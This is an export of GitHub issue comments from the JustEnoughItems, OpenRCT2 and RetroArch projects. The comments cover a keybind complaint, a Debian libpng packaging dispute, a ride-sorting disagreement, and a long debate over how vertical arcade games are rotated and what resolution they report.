JustEnoughItems/mezz/1153/368384656,I am close to banning you from my issue tracker. Please respond in a less pedantic way. ,,False,False,1153
JustEnoughItems/mezz/1153/368384673,Keybind o to hide all JEI not just the left pannel that mods add. Your currnet setup in your JEI keybinds that I saw said to hide something and that something with addon was left pannel by itself it did nothing without any addons. ,,False,False,1153
JustEnoughItems/mezz/1153/368384751,FUCK YOU YOU DON'T FUCKING READ SHIT IT SAYS RIGHT SIDE THE RIGHT JEI PANNEL NOT PATHETIC ,,False,False,1153
JustEnoughItems/mezz/1153/368385272,"In your original post it says Pedantic does not mean pathetic, look it up. I think you are the one who isn't reading carefully. Goodbye. ",,False,False,1153
JustEnoughItems/mezz/1153/368385361,"ok well actually this is a seperate issue control + 0 did hide it but, with the addon it wasn't weird maybe if you just told me it does hide the pannel with control + o to the right I wouldn't have been pissed sorry ",,False,False,1153
JustEnoughItems/mezz/1153/368386320," The very angry comment was deleted but I'm not putting up with that, I've blocked him now. / ",,False,False,1153
OpenRCT2/OpenRCT2/7186/297243925," OS [Debian Buster] Version [0.1.1] Commit/Build [4601265] ./openrct2 error while loading shared libraries libpng12.so.0 cannot open shared object file No such file or directory  [x] Reproducible in RCT2 (vanilla)? [ ] Multiplayer?  Steps to reproduce  Trying to run it praise  Notes 6697 is known to me and a clutch and not a solution Please, Please use AppImage to be less of an headache for 80 of the Linux Community  be linking to  and calling @friend for help ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365747676,"There is already  can you please detail what are the differences between the three available formats? Getting it packaged as snap required just a few minutes and a handful of lines in  (which I don't think I have handy right now) and I worked with upstream developers to improve Arch (my distro of choice) support, which was the major roadblock when the issue was filed. Please also take a look at  /  simply not true. Your  may be unable to do that, which is a deficiency of your package manager, but there is nothing stopping users from installing . ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365750702,"Ubuntu AND Debian (stable) already dropped support for that obsolete version of libPNG solution provide this obsolete version with the software (with appimage, flatpack, snap) or upgrade to the new version that offically replaces it. Again, there is a difference between a ""kludge"" and a ""solution"" ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365753387,"How about you approach us less aggressively? Do you honestly expect us to help you if you're talking to us like that? In any case, we still compile against libpng12 because of Ubuntu 16.04. That will most likely change when Ubuntu 18.04 comes out. ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365754485,"i dont see a reason to wait that long, ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365754902,"and sorry for that ""aggressiveness"", i have mental issues and lose myself quickly ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365755654,"Ok, thanks. ubuntu 17.10 is out already and dropped support while libpng16 is supported by ubuntu16.04 and up and also Debian Our CIs run on 16.04 and non-LTS images are not available. Furthermore, while libpng16 and libpng16-dev are available, attempting to install them means removing libfontconfig1-dev and libfreetype6-dev, both of which we need. ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365756249,what are the consequences of them being disabled? ,,False,False,7186
OpenRCT2/OpenRCT2/7186/365756269,"Said Debian user.  libpng 1.6 was first released 2013-02-14 and it only took 4 years for debian to notice  and  don't see what's the sudden rush all about. You're welcome to compile openrct2 on your system and we will properly use libpng 1.6. We will gladly accept any help to improve the situation, which you so kindly offered, but in the meantime I would suggest you tone down your demands a bit, as you come through as overly aggressive. See  for rough idea of how the upgrade of relevant CI jobs to 18.04 is meant to look like (TL;DR switch as soon as it's out) ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365757398,"yes, want to keep my system clean of kludges, i was forbidden to tinker with it unnecessary ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365757518,"Well, we can't compile without libfontconfig1-dev and libfreetype6-dev, unless we disable TTF rendering. But since normal builds have TTF rendering on, this is not a good idea - it means bugs can easily go unnoticed. Anyway, openrct2 can be compiled against libpng16, in case you compile stuff yourself. ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365758039,"i hate compiling, i am not a dev (yet), just an annoyed user that wants to play this game ",,False,False,7186
OpenRCT2/OpenRCT2/7186/365758436,"Well, we have given you a number of workarounds. It's up to you if you want to use them or not. ",,False,False,7186
OpenRCT2/OpenRCT2/7186/366066551,"congrats, the android version is playable,  i really hope you make the Linux version easy to use soon ",,False,False,7186
OpenRCT2/OpenRCT2/7186/366257556,@friend you can try using the packages from launchpad ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366422068,That's completely not true. ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366464763,i use wine for it already (which is sad) ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366470857,Ultimately it's up to you to use the builds we provide. ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366472167,@friend  how that??? the builds that youn provide dont work ,,False,False,7186
OpenRCT2/OpenRCT2/7186/365759422,then i would probably try the Android version instead ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366476498,"This is getting ridiculous. So you try a build done on Ubuntu and file an issue but refuse to try use another build on the grounds ""it is not your OS"" and keep on whining how you refuse to apply the fix… so why did you file the issue in the first place? There are fallacies in your arguments. As I said earlier ",,False,False,7186
OpenRCT2/OpenRCT2/7186/366438426,"i read that on the Debian Wiki, and i won't corrupt my system because some stranger told me to do... i am an end-user, i want a properly packaged version of this game to be able to play it, like everyone else does that successfully but OpenRCT2 ",,False,False,7186
OpenRCT2/OpenRCT2/7186/366475829,because your build does not work on my os ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366335434,"@friend i use Debian, i wrote that in the issue ",,False,False,7186
OpenRCT2/OpenRCT2/7186/366476926,"@friend we do not support Debian, for Linux distros it is up to the community to provide packages through the package manager of the distro. We do not have the manpower to provide specific builds / maintenance for every distro as they are far too many and they all have their subtle differences. You can either use a supported OS such as Windows or Ubuntu 16.04 or ask someone in the Debian community to provide a package for OpenRCT2. ",,False,False,7186
OpenRCT2/OpenRCT2/7186/366472597,This discussion is getting pointless. You said yourself you refuse to use the builds we provide ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366442313,"The obvious solution for you @friend is to run vanilla under wine or a windows VM until OpenRCT2 can be updated since you seem paranoid of contamination. (it's highly unlikely that you would break something by compiling this yourself. And that's why we have backups.) By the way, the second portion of your last post seems cut off. ",,False,False,7186
OpenRCT2/OpenRCT2/7186/389317462," migrated our Ubuntu docker images from Ubuntu 16.04 to Ubuntu 18.04, our future builds will be using that as a base ",,False,False,7186
OpenRCT2/OpenRCT2/7365/310209562," **OS** Windows X Sixty Four Bit (laptop) **Commit/Build** AA7FB35    Good evening. The issue I am experiencing concerns a preference pertaining to the sortition of all available attractions and rides. By default, there are entries for each ride as written in RCT2. The Vintage Cars get one slot, the Car Ride gets another, and so on, despite sharing the same track. There is a secondary option, which combines the rides and groups them by track type. This forces the Vintage Cars and Car Ride onto one slot, the Steeplechase and Soapbox Derby rides into one slot, and so on.   [ ] Reproducible in RCT2 (vanilla)? [ ] Specific to multiplayer?  Steps to reproduce     Dump file  Screenshots / Video  Save game  ",,False,False,7365
OpenRCT2/OpenRCT2/7186/366477282,"Look, we have suggested several options. You have dismissed most of them. That's not helping. And while I'm not completely happy how @friend handled some stuff here, you're not conversing in a very pleasant way either. In any case, this has gone out of hand, so I'll have to lock the conversation. ",,False,False,7186
OpenRCT2/OpenRCT2/7186/366475321,Why did you report the bug in the first place then? ,,False,False,7186
OpenRCT2/OpenRCT2/7186/366473629,the ppa builds are made for Ubuntu ,,False,False,7186
OpenRCT2/OpenRCT2/7365/377677502,"The old sorting made little sense the racing cars, sportscars and trucks were put together, but the cheshire cats and vintage cars were not. In addition, the old approach also restricted access to several track pieces and made it impossible to switch vehicles afterwards. I'm afraid we're not going to revert this decision. The RCT2 mechanism was disliked by a lot of people and supporting both means more complexity. ",,False,False,7365
OpenRCT2/OpenRCT2/7365/377707618,"Both were supported for a long, LONG time. Continuing that support would require no significant effort. Forcing your will on others who prefer the other system is wrong. I am not asking to change it back or make the correct version the default. I just want to be allowed to choose. I deserve a choice. Playing the game with tracks crushed together is very difficult for me, because I can't remember what I've selected or where. Not everyone plays the way you do. I deserve a choice, and I am sure the others who use the default system would be mad as well. Railroading your personal preferences on others is a mistake. ",,False,False,7365
OpenRCT2/OpenRCT2/7365/377710246,"You can always just play with an older version if it's that much trouble, can't you?  I've seen them implementing their own object files and stuff lately and so I would guess that maybe since they're doing that it's changing how the codebase works and it would take extra effort to support both methods going forward. ",,False,False,7365
OpenRCT2/OpenRCT2/7365/377710370,"You already made your choice to use OpenRCT2 instead of vanilla RCT2. You've gotten used to the way vanilla RCT2 handles things, OpenRCT2 changed it (and not just because it can be changed), and then you complain that it has. You can always use an older build from before, or play vanilla instead. By all means, feel free to fork this project and revert the commit that changed the behaviour, then play with your own build. So there are plenty of choices you can make. ",,False,False,7365
OpenRCT2/OpenRCT2/7365/377707710,"This mechanism was liked by a lot of people, too, given it was the way we played it for about twenty years! You can maintain choice, and the choice was already implemented! It's a matter of not wanting to. ",,False,False,7365
RetroArch/libretro/8551/480553748,some arcades have the monitor rotated 90 degrees. The  can the emulator can either rotate the image to the displays orientation or display it as intended and you rotated your display 90 degrees ,,False,False,8551
RetroArch/libretro/8551/430055555,"Description With vertically oriented games, Retroarch switches the emulator-provided width and height. For example, if the width/height is supposed to be 320x240, RA will switch this to 240x320. This only occurs with vertically oriented games. I tested this in both MAME and FBA using the Windows 64 bit version of RA. Expected behavior The game to be displayed using the correct resolution (width/height). Actual behavior The height and width is switched when a vertically oriented game is loaded. Steps to reproduce the bug  load any vertically oriented game in either FBA or MAME using Windows 64 bit version of RA. under video settings, enable integer scale.  set ""custom aspect ratio width/height"" to 1x. look at ""custom aspect ratio width/height"" to see that it says 240 for width and 320 for height. This is the reverse of what it should be.   Bisect Results I first noticed this a few days ago. Version/Commit You can find this information under Information/System Information  RetroArch 1.7.6 Git version 9750719074  Environment information  OS Windows 10  Compiler NA    ",,False,False,8551
OpenRCT2/OpenRCT2/7365/377727079,"@friend That, combined with the fact that the current system had matured enough, is indeed the reason we removed it. We created a new object format and we weren't going to support all of RCT2's cruft. @friend Oh, of course, you know this better than someone who actually maintains the software. If it would require no significant effort, then please do what @friend suggested and maintain your own fork with this feature put back in. Prove that I have no idea what I'm talking about if it's this easy. Hell, if you know better than we do, why don't you just go ahead and fix some of the bugs we have a hard time fixing? Why do you deserve a choice? How much did you pay for OpenRCT2? How much do I get paid for working on it? You have an awfully big mouth for someone who got all of this for free, especially considering I am investing a lot of spare time into this without any financial gain. You have no reason to demand we put this feature back, and especially not with the tone you're using. You don't have to like our decisions, you can discuss it with us, but the very least you could do is to treat us normally. I wouldn't tolerate this if this were a paid game and I got a salary from it, so I'm certainly not going to tolerate in these circumstances. ",,False,False,7365
RetroArch/libretro/8551/480587874,"I understand that, but the emulator-provided resolution should not be changed from the correct resolution, regardless of orientation. If the game is 320x240 it should be output as 320x240, not 240x320. The user can flip it or rotate it or resize it or whatever, but the output resolution from the emulator should remain the same (eg, 320x240 should be output as 320x240 before the user does stuff to it). Otherwise you get scaling artifacts unless you just happen to adjust the y axis to a multiple of both 240 and 320 (eg, 960). And if you’re playing a game that uses a weird resolution like 19XX (384x240), then it causes big problems with overscan or underscan when using integer scaling. As of right now, video aspect ratio for vertical games must be configured manually (custom ratio width/height, non-integer) along with custom ratio x/y position, because the resolution/ratio for vertical games isn’t being detected correctly. ",,False,False,8551
RetroArch/libretro/8551/480592063,the thing is the topic say the width and height are switched they simply arent it just a rotated monitor. It draws the image on the monitor as 43 then you flip the monitor physically this changes it to 34 on real hardware as far as the hardware is concerned its a normal 43 device but your rendering the image 90 degrees rotated. In mame2003 or plus just use tate mode this stop the rotation and you need to flip your monitor like a real one. look at sf2 this is on a 43 screen look at the resolution of the game it use crt timing when rendering to look the way it does in a crt if you used the literal resolution for sf2 the gfx would be overly stretched. ,,False,False,8551
RetroArch/libretro/8551/480592631,it looks like your talking about capcom games watch this to understand whats going on and it is indeed 43 ,,False,False,8551
RetroArch/libretro/8551/480595131,"I’m not referring exclusively to capcom games. You can see this behavior in the example screenshots I posted above, which are from Donpachi. I understand very well that certain games are meant to be displayed vertically. This doesn’t change anything that I’ve said. With a vertically-oriented 320x240 game, width should say 320 and height should say 240, and the displayed image should be sideways. On a 43 CRT monitor the image would be 320x240 and sideways. You then rotate the monitor 90 degrees. This doesn’t change the image to 240x320. It is still 320x240 but now it is rotated 90 degrees so it is no longer sideways. Altering the internal resolution of the game is incorrect, and will always result in scaling artifacts unless you happen to use a resolution that is a multiple of both 320 and 240. ",,False,False,8551
RetroArch/libretro/8551/480595698,If you display the arcade pcb to a CRT monitor in normal orientation it will be a 320x240 image that is sideways. You rotate the CRT 90 degrees. The resolution of the game remains unchanged. ,,False,False,8551
RetroArch/libretro/8551/480596063,yes resolution of you display remains unchanged. I dont have a crt to test whats going on there I would assume you should be using core provided information and tate mode on for mame2003 and plus dont know if the others support tate mode ,,False,False,8551
RetroArch/libretro/8551/480596550,You just aren’t getting what I’m saying. I’m going to have to post some screenshots later to help illustrate what’s going on currently and what should be going on instead. ,,False,False,8551
RetroArch/libretro/8551/480596681,can you make them screenshot in mame2003 and 2003+ with tate mode on so i can see what going on make sure your using core provided for aspect ratio as well in them screenshots will help a lot in seeing whats going on ,,False,False,8551
RetroArch/libretro/8551/480611617,"First of all, just look at the first two screenshots I posted above. See where it says ""custom aspect ratio width"" and ""custom aspect ratio height""  Both of these screenshots were taken with video rotation disabled. Width/height should be the reverse of what is shown in the above screenshots. ",,False,False,8551
RetroArch/libretro/8551/480611698,"Here is what it SHOULD look like with video rotation disabled. This is what is NOT happening, currently. I created this in GIMP by manually switching the height/width in GIMP.  ",,False,False,8551
RetroArch/libretro/8551/480612022,Here is what currently happens. Both of these are incorrect. video rotation disabled  video rotation enabled  ,,False,False,8551
RetroArch/libretro/8551/480612380,"Next, here are some tests conducted by HunterK. See how video height/width are switched from what it is in my screenshots in the very first post? That's what it should be.    ",,False,False,8551
RetroArch/libretro/8551/480612418,what emulator is this from here is screenshots from with ? ,,False,False,8551
RetroArch/libretro/8551/480612765,"Next, I made this shot by manually resizing the resolution to 1600x1200, and used a scanlines shader. Notice how the scanlines and mask are perfectly scaled with no scaling artifacts present. This could only be the case if the game's resolution is indeed 320x240. With the currently reported resolution of 240x320, you get scaling artifacts.  ",,False,False,8551
RetroArch/libretro/8551/480612817,"I already said what emulator is being used in my initial post. The behavior is present in both MAME and FBA in the Windows 64 bit version of RA. As you can see in the tests conducted by HunterK, this behavior is not present in the Linux version of RA. ",,False,False,8551
RetroArch/libretro/8551/480612964,this is mame2003 with tate mode on and off using core provided aspect ratio I cant speak for the other emulators   ,,False,False,8551
RetroArch/libretro/8551/480613114,....How is this helpful? ,,False,False,8551
RetroArch/libretro/8551/480613279,have you even tried running mame2003 with these settings it what it shoud do tate mode skips the rotating and renders like its should. ,,False,False,8551
RetroArch/libretro/8551/480613300,"How are we supposed to know what the core reported width and height are from the screenshots you just posted? Again, the issue is that the emulator reported height and width are not correct. ",,False,False,8551
RetroArch/libretro/8551/480613632,Tate mode ON solves the issue in MAME 2003. Tate mode off  Tate mode on  ,,False,False,8551
RetroArch/libretro/8551/480613938,i think mame current has rotation options in the tab menu dont know if they will work as expected though ,,False,False,8551
RetroArch/libretro/8551/480613968,"The problem is, tate mode ON in MAME 2003 should be the default for all emulators including FBA. This is what the image looks like when you connect the actual hardware to a CRT that isn't rotated. There shouldn't be any automatic switching for vertical-oriented games. Switching height/width (Tate mode off) should be something that the user has to select because it's altering the original output of the emulated hardware. Anything done to alter the original output of the emulated hardware in this way should be something that the user has to manually select. Still no idea how HunterK was able to get the image to to display correctly using FBA, and I'm still unable to get the other version of MAME to display the image correctly. ",,False,False,8551
RetroArch/libretro/8551/480614499,sure that can be true im sure most people dont have there displays rotated unless they have a barcade of some sort setup for vertical games only. Its  a personal opinion but feel free to post an issue on it is easy enough to change the defaults through issues in the emulators in question. I dont really feel strongly about this its one for the people in charge of the repos it switchable in mame2003 and plus anyway in the options so the default wont really matter it can be changed to suit your display ,,False,False,8551
RetroArch/libretro/8551/480614871,"I'm not just being pedantic, here. The width/height being switched isn't helpful and causes numerous potential issues. With the current behavior of height/width being automatically switched with vertical games, you still have to rotate the image if you want correct aspect ratio and orientation or to avoid a huge amount of letterboxing, and with height/width being switched like this, it results in scaling artifacts unless you happen to choose a resolution that is a multiple of both 320 and 240. Furthermore, there is still no way that I know of to get any emulator besides MAME 2003 to work correctly. The current rationale of ""people don't want to rotate their displays"" just isn't sufficient to justify this. ",,False,False,8551
RetroArch/libretro/8551/480616075,first of all i completely agree with you all options should be clear to change and i feel fba does cover this option well its just you have to restart for it to take effect/ ill need to look into mame current at a later time. I will tell you how to to fix fba got quick menu options turn vertical mode on and restart the emulator it should work as expected. ,,False,False,8551
RetroArch/libretro/8551/480618244,"In FBA, enabling vertical mode in the quick menu options and restarting the emulator does not fix the problem. I'm still getting this  ",,False,False,8551
RetroArch/libretro/8551/480618472,"Another problem related to this is the sheer number of knobs and dials related to video rotation. There are options related to video rotation in all of these places main menu -&gt;quick menu -&gt; options settings -&gt; video settings -&gt; core If I'm an average user, how am I supposed to know what to do with all of this? Even as an experienced user, this is quite confusing. ",,False,False,8551
RetroArch/libretro/8551/480619132,"SUCCESS. Actually, in FBA I have to turn vertical mode OFF under quick menu -&gt; options.  So, yes, there is a lot going on here. Each of the cores seems to be handling this in a different way and there are far too many knobs and dials related to this. Disabling vertical mode makes it work in FBA, while enabling tate mode in MAME 2003 makes it work there... how does that make any sense?! As things currently stand, the options for this are an incoherent mess. Even you thought that enabling vertical mode would be the same as enabling tate mode, which makes sense, intuitively. There just seems to be no rhyme or reason to the way these settings currently work. ",,False,False,8551
RetroArch/libretro/8551/480620589,"I'm still getting the same problem in FBA 2012. There is no option in quick menu -&gt; options for vertical mode. Under settings -&gt; core there is an option for ""enable rotation."" I'm getting the same results with this turned either ON or OFF. settings -&gt; core -&gt; allow rotation ON  settings -&gt; core -&gt; allow rotation OFF  ",,False,False,8551
RetroArch/libretro/8551/480622042,"as far as I can tell, the problem is the frontend based rotation not taking into account the aspect ratio change. I don't think we need so many knobs in the cores to do this, it should be one option in the frontend and that's all. I'm not even sure why there is a ROTATION ENV callback in the API ",,False,False,8551
RetroArch/libretro/8551/480628910,there is a reason for it to be there clearly this isint a front end issue. It cant guess if you have rotated you monitor 90 degrees physically you need to deal with this as a core option if that is the case. ,,False,False,8551
RetroArch/libretro/8551/480628956,"Agree w/fr500. In my opinion, a vertically-oriented game should look like this by default  The user can then rotate the image using the advanced user option under settings -&gt; video -&gt; rotation You could also add an option under video settings (""automatically rotate vertical games 90 degrees"" or something) to automatically set settings -&gt; video -&gt; rotation -&gt; 90 degrees whenever a vertical oriented game is detected. But, I'm getting ahead of myself. ",,False,False,8551
RetroArch/libretro/8551/480629221,"You're missing the larger issue which is that the emulator isn't always using the correct resolution. The resolution/aspect ratio should remain unchanged regardless of rotation- see above. A vertical game that is 320x240 should be output as 320x240. The frontend option for video rotation is more than sufficient and solves the problems related to the way things are currently handled, which are, to wit  it's incorrect according to what the original hardware does it's counter-intuitive  it results in scaling artifacts with integer scaling  ",,False,False,8551
RetroArch/libretro/8551/480630056,and how is the front end supposed to guess that this particular arcade is rotated or not mame2003 covers this i dont see how you can get the front end to be psychic ,,False,False,8551
RetroArch/libretro/8551/480630788,"I'm saying that the front end options are sufficient and that the cores are currently doing something wrong/there's too much going on with the cores. Just make the cores output the original resolution, unaltered, and let the user use the frontend options for rotation and aspect ratio. That would solve the problem(s). In standalone FBA, you get this by default, which is as it should be  With ""Video -&gt; rotate vertically aligned games -&gt; enabled"" you get this, which is again as it should be  ",,False,False,8551
RetroArch/libretro/8551/480631219,ok with you so far you failing to mention the users monitors physical orientation in all this ,,False,False,8551
RetroArch/libretro/8551/480631512,"I don't see why the monitor orientation is relevant to what resolution the core is outputting. Altering the height/width of the resolution so that the image is correctly oriented on a non-rotated monitor is altering the output resolution, and thus incorrect. The core should just output the unaltered resolution. Altering the resolution, aspect ratio or video rotation is all stuff that should happen on the frontend or through a user option that has to be selected. ",,False,False,8551
RetroArch/libretro/8551/480632602,"Also, as we can see, there's just a lot of weird stuff going on. TATE mode ON in MAME results in the same behavior as vertical mode OFF in FBA, and FBA 2012 won't display a correct image no matter what settings are applied, and I haven't even tested all the emulators yet. I understand the lack of standardization when it comes to core options, but this just seems somewhat ridiculous. ",,False,False,8551
RetroArch/libretro/8551/480632982,im trying to understand where you are hitting this from the cores arent scaling the resolution RA scaless the resolution to your display. ,,False,False,8551
RetroArch/libretro/8551/480633397,To what are you referring with this statement? ,,False,False,8551
RetroArch/libretro/8551/480633538,"If the front end can't detect whether a game is vertical or not, then it's the cores that are automatically switching the height/width for vertical games. ",,False,False,8551
RetroArch/libretro/8551/480634732,yes they do people that dont rotate there monitors dont want to play there vertical games sideways or rotate there monitor by default.  Tate mode wont rotated vertical games at all on mame2003 that what you requested. ,,False,False,8551
RetroArch/libretro/8551/480635529,"This whole discussion is pointless. There is not need to guess anything, this is software development, there is an API, an implementation, and a frontend. There is an API for this  the players are  core api frontend  Who knows the content needs rotation? The core does. The environment callback is a set, which means it's telling the frontend to ""do something"" So what should happen could go two ways a. The core tells the frontend ""hey video is rotated, adjust aspect ratio from what I reported accordingly"" b. The core tells the frontend ""hey this content requires rotation, do whatever you need to do so it works properly"" That's all. This is a frontend problem, but before anything can be do about it what we need is clarification from the API side so we can adjust both the frontend and the cores to do whatever needs to be done. That's all. ",,False,False,8551
RetroArch/libretro/8551/480640219,there is no front end issue some arcades have different rotations not just 90 degrees. The core needs to work this out the user will need to be more specific from what he says he wants vertical games to display like this by default  which is perfectly valid if you have a rotated monitor.  this is how it displays when you dont have a rotated monitor the user seems to think this is wrong  ,,False,False,8551
RetroArch/libretro/8551/480641025,"Ok, you win, have fun arguing forever instead of proposing a solution. ",,False,False,8551
RetroArch/libretro/8551/480641314,Ok you have a 43 monitor it draws as 43 like the fist picture you rotate it the monitor in the arcade 90 degrees what aspect ratio is it now for us to display on out normal monitor sitting on the tv stand? ill leave you two to it ,,False,False,8551
RetroArch/libretro/8551/480643111,"I don't understand all of this, but it sounds very reasonable. Yes, it does seem grant2258 and I have been going in circles with this. I think I've provided enough info on the problem as it currently stands to work towards a solution, but since I'm not a programmer, I've probably done all I can by this point. ",,False,False,8551
RetroArch/libretro/8551/480646624,i agree with that  @friend  im sure @friend has some idea looking forward to seeing what he is going to do since he thinks there is an issue and what exactly is wrong as i cant see any issue at all with mame2003 or fba on libretro it both have the ability rotate or not rotate vertical games. It does it the same way as mainline fba and mame. So i wll digress im at a bit of a loss what you two seem to think the issue is is you want to maintain a 43 ratio you need to rotate the Monitor or physically force the aspect ratio to 43 when rotating and put up with the streched gfx ,,False,False,8551
RetroArch/libretro/8551/480651030,"The issue is that the behavior isn't consistent across cores and it's confusing as hell what is actually going on. There is the separate issue of what the default behavior should be for vertical games, which you seem to be caught up on. As of right now, MAME and FBA do the exact opposite thing with video_allow_rotate = true/false. And that's just two cores. Who knows what's going on with other cores; I haven't even had a chance to test them yet. TATE on and video_allow_rotate = true in MAME 2003 produces the same results as vertical mode on and video_allow_rotate = false in FBA. How does this make any sense? posting this for reference, read from this post down. ",,False,False,8551
RetroArch/libretro/8551/480652403," automatically switching the width/height for vertical oriented games is altering the output resolution, which is incorrect. The emulator should just output the resolution completely unaltered. Altering what is output by the emulator should always be done by the frontend, or through an option that the user has to manually select, but maybe that's just my opinion. The default should just be whatever the emulator spits out before you start doing stuff to it.  rotating the game is something that can be easily handled in the frontend without all of the confusion that currently exists  2 is something that can even be done automatically if desired by the user, through the frontend as explained by fr500.  the current method of automatically switching the height/width with vertical games will always result in scaling artifacts no matter what you set the aspect ratio to (unless it's a multiple of both 240 and 320). How can this be considered correct?  the current method of automatically switching the height/width of vertical games isn't even making things easier for the user in all cases, because video_allow_rotate = true/false isn't doing the same thing in all cores. The current method is just adding more confusion.   My brain is tired. Hopefully the thread I linked to above sheds some additional light on the problem. ",,False,False,8551
RetroArch/libretro/8551/480656907,"IMO Standalone FBA does things right. See  default it's sideways and 320x240, and there's a clearly labeled and easily accessed option to rotate video under the video menu. There should be a way to make RA work the same with all cores using one of the methods @friend described (it may need either a or b depending on what the core is doing). You could then add an easily accessed user option to automatically rotate vertical games. Or we could just endlessly debate what the default behavior should be when launching RA for the first time. ",,False,False,8551
RetroArch/libretro/8551/480660954,Ok here is the screenshots with you information the core geometry is reporting the right resolution  Ra ,,False,False,8551
RetroArch/libretro/8551/480911698,"I'm trying to figure out the point you're trying to make. If you're still arguing over what the default behavior should be when launching RA for the first time, I'm done with that conversation. ",,False,False,8551
RetroArch/libretro/8551/480912425,you rotate 320 x 240  image 90 degrees is becomes 240 x 320 thats as simple as you can describe it ,,False,False,8551
RetroArch/libretro/8551/480913207,Who is disputing that? What is the point of this? ,,False,False,8551
RetroArch/libretro/8551/480914297,,,False,False,8551
RetroArch/libretro/8551/480914973,"Yes, and how do you think what you just said contradicts this statement? I think there is a language barrier here that is preventing meaningful discussion. ",,False,False,8551
RetroArch/libretro/8551/480915661,that was you that it in your first post   your rotate an images the 90 degrees THE x /y swap ,,False,False,8551
RetroArch/libretro/8551/480916855,"Furthermore, the conversation has progressed quite a bit beyond the initial post. If you had been keeping up with the conversation you'd realize that the real issue is a lack of consistency between cores when it comes to the options related to video rotation. I am 100% done debating with you what the default behavior related to video rotation should be. It doesn't matter what the default behavior is. There are pros and cons to having rotation on or off by default and ultimately it's just an arbitrary decision that has to be made. What matters now is getting consistent behavior across cores and removing unnecessary knobs/dials that just lead to more confusion. @friend already outlined the solution and what he needs to implement it. ",,False,False,8551
RetroArch/libretro/8551/480917580,"I literally can't even tell what you're trying to say, here. I'm sorry, I really don't want to offend but the language barrier is just too much to deal with. I feel like you just consistently fail to understand the point being made and respond with irrelevant information most of the time and now I'm just wasting a lot of time trying to clarify things to you. I appreciate that you're trying to help, but we haven't been getting anywhere for a while. ",,False,False,8551
RetroArch/libretro/8551/480921992,i literally cant even figure your problem out the games will show sideways if they arent rotated. mame fba and lr cores do this. So i guess i leave it at this not wasting more time on you back tracking it not a good default leaving vertical games sideways. Something you claimed fba done ,,False,False,8551
RetroArch/libretro/8551/480942598,"did you even bother following the steps I listed to reproduce the bug? Or bother looking at the discussion at the libretro forums? There is most definitely something weird currently going on with video rotation and height/width being switched. It's not a problem present in all cores. Rotation behavior is not consistent across cores, for the nth time. That's probably the main problem. FFS, the screenshots I provided prove it! Facepalm. Here, to make things even clearer   ",,False,False,8551
RetroArch/libretro/8551/480948593,you rotated the image  what do you expect to happen? you screen shots prove nothing accept the video is rotated and not rotated.  fba and mame2003 create the same images ,,False,False,8551
RetroArch/libretro/8551/480948833,That's exactly what I expect to happen. Do you see that you're just not following what I'm saying very well? ,,False,False,8551
RetroArch/libretro/8551/480949068,"No they don't, and I've provided numerous examples demonstrating this. ",,False,False,8551
RetroArch/libretro/8551/480949376,I guess you dont get it when you rotate the video it becomes 34 proof is in the screen shot from fba rotated. it 240 x 230 as well not wasting any more time repeating this  ,,False,False,8551
RetroArch/libretro/8551/480950665,"Read this thread, from this post down to the end. Others clearly recognize that there is an issue.   just go away. You aren't getting it and I've reached the limit of my patience with this. ",,False,False,8551
RetroArch/libretro/8551/480951120,is fba wrong as well. Ive lost my patience with this as well. ,,False,False,8551
RetroArch/libretro/8551/480958875,"From the thread I just linked to, above So, yeah. It's not that you're wrong, it's just that you never quite understood what the problem was in the first place. Thankfully, the issue with FBA was recognized and corrected by BarbuDreadMon. ",,False,False,8551
RetroArch/libretro/8551/480966333,sending the wrong geometry form the core to fix it i would say thats out of spec and a patch. im sure mark will patch mame2003 and + up to send wrong info so it works in mame2003 and plus. Its trivial to do never the less i wont be changing is as its out of spec to whats really happening. no matter what your little numbers say the resolution is 240 x 320 when rotated ) ,,False,False,8551
RetroArch/libretro/8551/481212456,"i can explain the reasoning behind TATE mode core option in mame2003 the emulator sends two bits of information to the retroarch API; the games width and height, and how much it should be rotated so, for a typical arcade game, that would be width 320 height 240 rotation 0 (none) now, for a typical arcade vertical game (which were rendered sideways, and then the CRT was rotated when put in the cabinet), that information would be be width 240 height 320 rotation 1/3 (90/270 degrees) the issue is, retroarch uses the sent height and width regardless of whether it has been rotated or not. so, the emulator has to send the width and height of the game on the presumption that the rotation has happened. so, if you set  you will get an unwanted result ♠video_allow_rotate = truevideo_allow_rotate = falsevideo_allow_rotate = falsevideo_allow_rotate = false`)  (PS, screenshots from behaviour of mame2003 for a year or so ago, and retroarch 1.3.6 - this is what i originally designed TATE mode on - someone else rewrote TATE mode in 2003 so it instead does the rotations within the core itself - personally i think it should all be handled in the front end) so hopefully that shows the issue that TATE mode was trying to solve. IMO there's some better solutions 1) the API lets the core find out what video_allow_rotate is set to. that way, it can send the appropriate height/width for the situation. 2) rotation of 1 (90) or 3 (270deg) also flips the height/width. this would be my preference. i haven't really thought about the ramifications of these! ) ",,False,False,8551
RetroArch/libretro/8551/481215666,there is also some interplay with aspect_ratio that I've forgotten the details about. ,,False,False,8551
RetroArch/libretro/8551/481292393,the front end is still doing the rotating in mame2003 the fix is trivial your just dont swap change the x/y (like you should be doing in the core geometry).    rotate anything manually the geometory x/y in the menu doesnt change. ,,False,False,8551
